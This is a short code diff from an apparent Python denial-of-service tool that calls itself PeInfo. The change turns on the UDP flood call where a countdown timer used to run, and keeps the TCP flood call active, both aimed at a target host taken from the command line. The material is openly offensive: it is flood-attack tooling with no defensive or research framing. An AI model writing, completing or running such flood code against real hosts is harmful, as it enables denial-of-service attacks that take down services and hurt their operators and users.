@@ -43,8 +43,8 @@ class DDoS:
                self.target = sys.argv[-1]
                print("PeInfo attacking DDoS with UDP method with target", self.target, "with thread", thread, "and port", port, f"for {second}s")
                if self.ping_host(self.target):
-                  self.countdown_timer(seconds=int(second), port=int(port), thread=thread)
-                  # self.start_udp_flood(port=int(port), threads_count=int(thread))
+                  self.start_udp_flood(port=int(port), threads_count=int(thread))
+                  # self.countdown_timer(seconds=int(second), port=int(port), thread=thread)
                break
             else:
                Help.exampleUsage()
@@ -64,8 +64,8 @@ class DDoS:
                self.target = sys.argv[-1]
                print(Fore.RED, "PeInfo attacking DDoS with TCP method with target", self.target, "with thread", thread, "and port", port)
                if self.ping_host(self.target):
-                  # self.countdown_timer(seconds=int(second), port=port, thread=thread)
                   self.start_tcp_flood(threads_count=int(thread))
+                  # self.countdown_timer(seconds=int(second), port=port, thread=thread)
                break
             else:
                Help.exampleUsage()
